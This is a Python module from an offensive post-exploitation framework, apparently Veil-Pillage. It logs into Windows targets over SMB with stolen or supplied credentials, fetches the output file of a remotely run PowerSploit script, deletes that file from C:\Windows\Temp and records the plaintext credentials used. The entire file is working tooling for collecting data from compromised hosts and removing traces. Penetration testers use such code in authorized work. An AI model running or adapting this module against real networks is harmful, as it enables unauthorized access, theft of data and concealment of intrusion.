"""

Downloads the results from an abitrarily invoked
PowerSploit/Powershell hosted file file.


Module built by @harmj0y

"""

import time

import settings

from lib import command_methods
from lib import helpers
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Invoke-Script download results."
        self.description = "Downloads the results of an arbitrarily invoked Powershell script"

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = { "out_file"  : ["out.txt", "temporary output filename used"] }


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        out_file = self.required_options["out_file"][0]

        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        for target in self.targets:
 
            # grab the output file and delete it
            out = smb.getFile(target, username, password, out_file, delete=True)

            # save the file off to the appropriate location
            saveFile = helpers.saveModuleFile(self, target, "invoke-script.txt", out)

            if out != "":
                self.output += "[*] Invoke-Script results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
            else:
                self.output += "[!] Invoke-Script execution failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"

